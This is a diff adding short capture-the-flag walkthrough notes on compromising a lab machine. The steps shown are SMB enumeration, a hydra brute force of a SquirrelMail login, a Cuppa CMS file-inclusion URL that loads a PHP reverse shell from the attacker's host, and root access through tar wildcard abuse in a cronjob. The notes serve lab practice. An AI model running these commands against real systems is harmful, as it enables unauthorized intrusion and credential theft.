@@ -1,0 +1,44 @@
+Nmap Done.
+
+found imap, pop3 email services and also smb
+did smb shares enumeration using smbmap or u can use enum4linux
+> enum4lunx -a $IP
+
+found the shares. acces shares as anonymous which was allowed.
+found the password file.
+
+gobuster dir -u http://10.10.118.177:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+found /squirrelmail server in which we can do rce if know credentials.
+
+use hydra to crack password of milesdyson
+
+hydra 10.10.118.177 -l milesdyson -P log1.txt http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
+
+found the password of miledyson.
+
+found the smb password of milesdyson.
+smbclient //10.10.118.177/milesdyson -U milesdyson
+
+found a file have a hidden directory in it.
+/45kra24zxs28v3yd
+
+used gobuster against that.
+found a directory called administrator/
+
+in which cuppa cms is hosted for which a public exploit is available.
+We need a php reverseshell(pentestmonkey) and start the python server and upload it into the server.
+
+http://10.10.118.177/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.225.184:1444/shell.php
+
+you will get the shell Now.
+
+After that, I found that few cronjobs are running as root using the miledyson dir in which I have access.
+
+After checking the shell script, found out that tar is using the wildcard which is vulnerable. followed 
+https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/
+
+Got the root!
+
+
+
+ 
